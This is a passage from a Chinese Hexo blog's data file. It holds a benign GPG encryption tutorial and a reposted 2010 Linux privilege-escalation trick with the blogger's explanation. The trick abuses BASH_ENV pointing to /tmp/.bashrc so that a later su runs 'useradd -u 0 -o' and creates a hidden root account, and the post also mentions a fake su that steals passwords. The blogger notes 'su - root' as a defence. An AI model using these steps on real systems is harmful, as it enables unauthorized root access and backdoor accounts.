--gen-key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #生成密钥对\nshell&gt;gpg -K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #查看私钥\nshell&gt;gpg --list-keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; #查看公钥\n主要是加密种类、名称、日期、密码等\n2.导出公钥。（本机）\nshell&gt;gpg --export -a -r <em>[key1088]</em>&gt; pub.key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #导出名字为key1088的公钥。\n把生成的公钥，发送到目标电脑。\n3.导入目标（目标）\nshell&gt;gpg --import <em>[pub.key]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em>#导入名字为pub.key的文件\nshell&gt;gpg --list-keys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #查看公钥，有没有key1088公钥。\n4.加密（目标）\nshell&gt;gpg -e -r <em>[key1088]&nbsp;&nbsp; test.txt &nbsp;&nbsp;&nbsp;&nbsp;</em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #使用key1088的公钥，加密test.txt文件 ,生成一个名字为test.txt.asc\nshell&gt;gpg <em>[test.txt.asc]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em> #失败！！会提示没有密钥。只有蜜月才可以解密。\n把加密文件，发送到本机，进行解密。\n5.解密（本机）\nshell&gt;gpg <em>[test.txt.asc]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #输入密码方可解密。<br />\n&nbsp;","slug":"linux-下-GPG加解密","published":1,"updated":"2023-04-22T05:38:44.790Z","_id":"clgrjlxh6003r7opif3fcbsql","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong></strong><br>互联网是不安全，当今是，将来也是。加密和解密都是相对的，都是有难度系数也确定的。<br>GPG 有两个key，一个是公钥，一个是私钥。公钥加密，私钥解密。<br>要想加密，必须拥有自己或者别人的公钥key。<br>要想解密，必须拥有该加密文件的私钥key和密码。<br>简单的记录一下。<br>&amp;nbsp;<br>&amp;nbsp;<br>1.生成密钥对。（本机）<strong></strong><br>shell &gt;gpg –gen-key&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #生成密钥对<br>shell&gt;gpg -K&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #查看私钥<br>shell&gt;gpg –list-keys&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; #查看公钥<br>主要是加密种类、名称、日期、密码等<br>2.导出公钥。（本机）<br>shell&gt;gpg –export -a -r <em>[key1088]</em>&gt; pub.key&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #导出名字为key1088的公钥。<br>把生成的公钥，发送到目标电脑。<br>3.导入目标（目标）<br>shell&gt;gpg –import <em>[pub.key]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>#导入名字为pub.key的文件<br>shell&gt;gpg –list-keys&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #查看公钥，有没有key1088公钥。<br>4.加密（目标）<br>shell&gt;gpg -e -r <em>[key1088]&amp;nbsp;&amp;nbsp; test.txt &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #使用key1088的公钥，加密test.txt文件 ,生成一个名字为test.txt.asc<br>shell&gt;gpg <em>[test.txt.asc]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em> #失败！！会提示没有密钥。只有蜜月才可以解密。<br>把加密文件，发送到本机，进行解密。<br>5.解密（本机）<br>shell&gt;gpg <em>[test.txt.asc]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #输入密码方可解密。<br /><br>&amp;nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong></strong><br>互联网是不安全，当今是，将来也是。加密和解密都是相对的，都是有难度系数也确定的。<br>GPG 有两个key，一个是公钥，一个是私钥。公钥加密，私钥解密。<br>要想加密，必须拥有自己或者别人的公钥key。<br>要想解密，必须拥有该加密文件的私钥key和密码。<br>简单的记录一下。<br>&amp;nbsp;<br>&amp;nbsp;<br>1.生成密钥对。（本机）<strong></strong><br>shell &gt;gpg –gen-key&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #生成密钥对<br>shell&gt;gpg -K&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #查看私钥<br>shell&gt;gpg –list-keys&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; #查看公钥<br>主要是加密种类、名称、日期、密码等<br>2.导出公钥。（本机）<br>shell&gt;gpg –export -a -r <em>[key1088]</em>&gt; pub.key&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #导出名字为key1088的公钥。<br>把生成的公钥，发送到目标电脑。<br>3.导入目标（目标）<br>shell&gt;gpg –import <em>[pub.key]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>#导入名字为pub.key的文件<br>shell&gt;gpg –list-keys&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #查看公钥，有没有key1088公钥。<br>4.加密（目标）<br>shell&gt;gpg -e -r <em>[key1088]&amp;nbsp;&amp;nbsp; test.txt &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #使用key1088的公钥，加密test.txt文件 ,生成一个名字为test.txt.asc<br>shell&gt;gpg <em>[test.txt.asc]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em> #失败！！会提示没有密钥。只有蜜月才可以解密。<br>把加密文件，发送到本机，进行解密。<br>5.解密（本机）<br>shell&gt;gpg <em>[test.txt.asc]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</em>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #输入密码方可解密。<br /><br>&amp;nbsp;</p>\n"},{"title":"linux下$BASH_ENV变量的利用","date":"2010-08-13T12:25:00.000Z","_content":"转载一编提权文章做解释：<br /><p>一个linux提权用的技巧，放出来攒RP了。<br />OK，通常情况下，我们在执行bash脚本的时候，有一个执行过程，其中有一点比较重要:如果BASH_ENV被设置的话，它就会执行BASH_ENV指向的脚本<br />一个test:<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />[xiaoyu@localdomain ~]$ export BASH_ENV=&quot;/tmp/.bashrc&quot;<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ cat /tmp/.bashrc<br />#!/bin/bash<br />echo &quot;Hello&quot;<br />[xiaoyu@localdomain ~]$ ls -l<br />-rwxrwxr-x 1 xiaoyu xiaoyu 22 2008-09-11 05:54 test.sh</p><p>[xiaoyu@localdomain ~]$ cat test.sh<br />#!/bin/bash<br />echo &quot;kk&quot;<br />[xiaoyu@localdomain ~]$ ./test.sh<br />Hello<br />kk</p><p>恩，很好，和我们预期的一样。看看我们怎么利用。</p><p>grep su ~/.bash_history<br />显示此用户有使用su登录root账户的特殊癖好。以前我们遇到这种情况通常就是塞个fakesu.c进去。然后修改.bash_profile，建立个别 名之类的东西。通过getpass来获得root密码，记录，然后去除别名.....关键是管理员使用正确密码登录的时候也是会提示一次密码错误。遇到傻 点的管理员可能就放过这个细节了，再输入一遍密码就OK了。但是某些非人类admin会以最快的速度检查系统被入侵的迹象，外加啥啥啥，而且这种管理员改  root密码几乎是肯定的了。所以偷取下来的密码也没啥用处。恩，聪明的X客们一定知道我要做什么了。呵呵，先看看环境变量su后在不<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ su<br />Password:<br />[root@localdomain xiaoyu]# echo $BASH_ENV<br />/tmp/.bashrc</p><p>OK，实验结束，实战：<br />以下是引用片段：<br />[xiaoyu@localdomain tmp]$ echo ’/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null’ &gt; /tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ cat /tmp/.bashrc<br />/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null<br />[xiaoyu@localdomain tmp]$ grep kk /etc/passwd<br />[xiaoyu@localdomain tmp]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ su<br />Password:<br />[root@localdomain tmp]# cd /home/xiaoyu</p><br /><br />解释。<br />.bash_profile 文件内容<br /><br /># .bash_profile<br /><br /># Get the aliases and functions<br />if [ -f ~/.bashrc ]; then<br />. ~/.bashrc<br />fi<br /><br /># User specific environment and startup programs<br /><br />PATH=$PATH:$HOME/bin<br /><br />export PATH<br />unset USERNAME<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />.bashrc文件<br /># .bashrc<br /><br /># User specific aliases and functions<br /><br />alias rm='rm -i'<br />alias cp='cp -i'<br />alias mv='mv -i'<br /><br /># Source global definitions<br />if [ -f /etc/bashrc ]; then<br />. /etc/bashrc<br />fi<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />每当执行bash脚本，就会调用。默认是=&gt;bash_profile。它在调用别的脚本。<br /><br />$BASH_ENV变量定义后，直接掉过常规。<br />/tmp目录默认谁都可以写的，谁都可以调用。在httpd提权时，可以上传文件到这，可惜没有拿下。<br /><br />export定义环境变量，启动一个shell后会改变。<br /><br />只用su进去之后，环境变量没有改变。所以调用BASH时，创建用户。<br /><br />$:su - root&#160; //可以预防，改变环境变量到root。 <br /><br /><br /><br /><br />","source":"_posts/linux下$BASH_ENV变量的利用.md","raw":"title: linux下$BASH_ENV变量的利用\ncategories: [Linux,Shell编程]\ntags: []\ndate: 2010-08-13 20:25:00\n---\n转载一编提权文章做解释：<br /><p>一个linux提权用的技巧，放出来攒RP了。<br />OK，通常情况下，我们在执行bash脚本的时候，有一个执行过程，其中有一点比较重要:如果BASH_ENV被设置的话，它就会执行BASH_ENV指向的脚本<br />一个test:<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />[xiaoyu@localdomain ~]$ export BASH_ENV=&quot;/tmp/.bashrc&quot;<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ cat /tmp/.bashrc<br />#!/bin/bash<br />echo &quot;Hello&quot;<br />[xiaoyu@localdomain ~]$ ls -l<br />-rwxrwxr-x 1 xiaoyu xiaoyu 22 2008-09-11 05:54 test.sh</p><p>[xiaoyu@localdomain ~]$ cat test.sh<br />#!/bin/bash<br />echo &quot;kk&quot;<br />[xiaoyu@localdomain ~]$ ./test.sh<br />Hello<br />kk</p><p>恩，很好，和我们预期的一样。看看我们怎么利用。</p><p>grep su ~/.bash_history<br />显示此用户有使用su登录root账户的特殊癖好。以前我们遇到这种情况通常就是塞个fakesu.c进去。然后修改.bash_profile，建立个别 名之类的东西。通过getpass来获得root密码，记录，然后去除别名.....关键是管理员使用正确密码登录的时候也是会提示一次密码错误。遇到傻 点的管理员可能就放过这个细节了，再输入一遍密码就OK了。但是某些非人类admin会以最快的速度检查系统被入侵的迹象，外加啥啥啥，而且这种管理员改  root密码几乎是肯定的了。所以偷取下来的密码也没啥用处。恩，聪明的X客们一定知道我要做什么了。呵呵，先看看环境变量su后在不<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ su<br />Password:<br />[root@localdomain xiaoyu]# echo $BASH_ENV<br />/tmp/.bashrc</p><p>OK，实验结束，实战：<br />以下是引用片段：<br />[xiaoyu@localdomain tmp]$ echo ’/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null’ &gt; /tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ cat /tmp/.bashrc<br />/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null<br />[xiaoyu@localdomain tmp]$ grep kk /etc/passwd<br />[xiaoyu@localdomain tmp]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ su<br />Password:<br />[root@localdomain tmp]# cd /home/xiaoyu</p><br /><br />解释。<br />.bash_profile 文件内容<br /><br /># .bash_profile<br /><br /># Get the aliases and functions<br />if [ -f ~/.bashrc ]; then<br />. ~/.bashrc<br />fi<br /><br /># User specific environment and startup programs<br /><br />PATH=$PATH:$HOME/bin<br /><br />export PATH<br />unset USERNAME<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />.bashrc文件<br /># .bashrc<br /><br /># User specific aliases and functions<br /><br />alias rm='rm -i'<br />alias cp='cp -i'<br />alias mv='mv -i'<br /><br /># Source global definitions<br />if [ -f /etc/bashrc ]; then<br />. /etc/bashrc<br />fi<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />每当执行bash脚本，就会调用。默认是=&gt;bash_profile。它在调用别的脚本。<br /><br />$BASH_ENV变量定义后，直接掉过常规。<br />/tmp目录默认谁都可以写的，谁都可以调用。在httpd提权时，可以上传文件到这，可惜没有拿下。<br /><br />export定义环境变量，启动一个shell后会改变。<br /><br />只用su进去之后，环境变量没有改变。所以调用BASH时，创建用户。<br /><br />$:su - root&#160; //可以预防，改变环境变量到root。 <br /><br /><br /><br /><br />","slug":"linux下$BASH_ENV变量的利用","published":1,"updated":"2023-04-22T05:38:44.812Z","_id":"clgrjlxh7003s7opi0477hc6n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>转载一编提权文章做解释：<br /><p>一个linux提权用的技巧，放出来攒RP了。<br />OK，通常情况下，我们在执行bash脚本的时候，有一个执行过程，其中有一点比较重要:如果BASH_ENV被设置的话，它就会执行BASH_ENV指向的脚本<br />一个test:<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />[xiaoyu@localdomain ~]$ export BASH_ENV&#x3D;&quot;&#x2F;tmp&#x2F;.bashrc&quot;<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain ~]$ cat &#x2F;tmp&#x2F;.bashrc<br />#!&#x2F;bin&#x2F;bash<br />echo &quot;Hello&quot;<br />[xiaoyu@localdomain ~]$ ls -l<br />-rwxrwxr-x 1 xiaoyu xiaoyu 22 2008-09-11 05:54 test.sh</p><p>[xiaoyu@localdomain ~]$ cat test.sh<br />#!&#x2F;bin&#x2F;bash<br />echo &quot;kk&quot;<br />[xiaoyu@localdomain ~]$ .&#x2F;test.sh<br />Hello<br />kk</p><p>恩，很好，和我们预期的一样。看看我们怎么利用。</p><p>grep su ~&#x2F;.bash_history<br />显示此用户有使用su登录root账户的特殊癖好。以前我们遇到这种情况通常就是塞个fakesu.c进去。然后修改.bash_profile，建立个别 名之类的东西。通过getpass来获得root密码，记录，然后去除别名…..关键是管理员使用正确密码登录的时候也是会提示一次密码错误。遇到傻 点的管理员可能就放过这个细节了，再输入一遍密码就OK了。但是某些非人类admin会以最快的速度检查系统被入侵的迹象，外加啥啥啥，而且这种管理员改  root密码几乎是肯定的了。所以偷取下来的密码也没啥用处。恩，聪明的X客们一定知道我要做什么了。呵呵，先看看环境变量su后在不<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain ~]$ su<br />Password:<br />[root@localdomain xiaoyu]# echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc</p><p>OK，实验结束，实战：<br />以下是引用片段：<br />[xiaoyu@localdomain tmp]$ echo ’&#x2F;usr&#x2F;sbin&#x2F;useradd -u 0 -o kk 2&gt; &#x2F;dev&#x2F;null’ &gt; &#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain tmp]$ cat &#x2F;tmp&#x2F;.bashrc<br />&#x2F;usr&#x2F;sbin&#x2F;useradd -u 0 -o kk 2&gt; &#x2F;dev&#x2F;null<br />[xiaoyu@localdomain tmp]$ grep kk &#x2F;etc&#x2F;passwd<br />[xiaoyu@localdomain tmp]$ echo $BASH_ENV<br />&#x2F;tmp&#x2F;.bashrc<br />[xiaoyu@localdomain tmp]$ su<br />Password:<br />[root@localdomain tmp]# cd &#x2F;home&#x2F;xiaoyu</p><br /><br />解释。<br />.bash_profile 文件内容<br /><br /># .bash_profile<br /><br /># Get the aliases and functions<br />if [ -f ~&#x2F;.bashrc ]; then<br />. ~&#x2F;.bashrc<br />fi<br /><br /># User specific environment and startup programs<br /><br />PATH&#x3D;$PATH:$HOME&#x2F;bin<br /><br />export PATH<br />unset USERNAME<br /><br />———————————————————————————————————————————-<br />———————————————————————————————————————————-<br />.bashrc文件<br /># .bashrc<br /><br /># User specific aliases and functions<br /><br />alias rm&#x3D;’rm -i’<br />alias cp&#x3D;’cp -i’<br />alias mv&#x3D;’mv -i’<br /><br /># 